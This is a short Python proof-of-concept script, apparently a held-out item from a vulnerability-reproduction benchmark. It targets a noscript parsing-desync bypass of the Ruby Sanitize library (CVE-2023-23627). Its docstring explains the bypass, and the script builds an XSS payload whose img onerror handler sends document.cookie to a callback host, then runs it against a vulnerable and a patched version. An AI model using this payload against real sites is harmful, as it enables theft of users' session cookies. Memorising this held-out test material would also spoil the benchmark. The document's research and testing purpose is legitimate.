#!/usr/bin/env python3
"""[HELD-OUT] CVE-2023-23627 residual -- the <noscript> scripting-desync sanitization bypass that
bypasses the CVE-2020-4054 (sanitize 5.2.1) foreign-content fix.

Same sink (`Sanitize.fragment(input, RELAXED+noscript)`), same exfil channel as the seed. The 5.2.1
fix only closed the <math>/<svg> foreign-content leak (added math/svg/plaintext/xmp to
`:remove_contents`). It did NOT touch `<noscript>`: when a custom allowlist explicitly permits
`noscript`, Sanitize keeps the element and its contents. Nokogiri (Sanitize's parser) has no
scripting support, so it always parses `<noscript>` under the "scripting DISABLED" HTML rules --
treating the element's contents as normal markup. A real browser has scripting ENABLED, so it parses
`<noscript>` contents as RAW TEXT. That desync is the bug (GHSA-fw3g-2h3j-qmm7):

    <noscript><div id="</noscript><img src=x onerror=...> "></noscript>

Scripting-DISABLED (Nokogiri/Sanitize): the `</noscript>` sits inside the `<div>`'s `id` attribute
value, so Sanitize sees only a benign <div> with a weird id and passes it through -- server-side
output on V1 keeps the string verbatim (verified). Scripting-ENABLED (browser): `<noscript>` content
is raw text, so the FIRST literal `</noscript>` closes the element and the trailing
`<img src=x onerror=...>` is parsed as a LIVE element -> onerror fires on load -> reads
document.cookie -> flag exfiltrated. The 5.2.1 foreign-content fix never covered this noscript path
-> INCOMPLETE FIX.

On V2 (sanitize 6.0.1, the CVE-2023-23627 fix) CleanElement does `node.unlink` for every
`<noscript>` regardless of the allowlist, so the element and its contents are removed -> server-side
output is '' -> BLOCKED. (Payload adapted from the upstream regression test added in 6.0.1:
`<noscript><div id='</noscript>&lt;img src=x onerror=alert(1)&gt; '>`.)
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

# The CVE-2023-23627 regression-test payload, benign-canary variant: javascript in an <img onerror>
# smuggled past a scripting-disabled parse via the <noscript> desync; reads document.cookie ->
# internal callback. `id="..."` uses double quotes so the single-quoted exfil string nests cleanly.
BYPASS_PAYLOAD = (
    '<noscript><div id="</noscript>&lt;img src=x '
    "onerror=document.location='" + CB + "'+document.cookie&gt; \"></div>"
)


def bypass_poc(*, version="v1"):
    """Run the CVE2 <noscript> scripting-desync residual on `version`; return the callback dump
    (flag on V1)."""
    return run_payload(BYPASS_PAYLOAD, version, mode="load")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
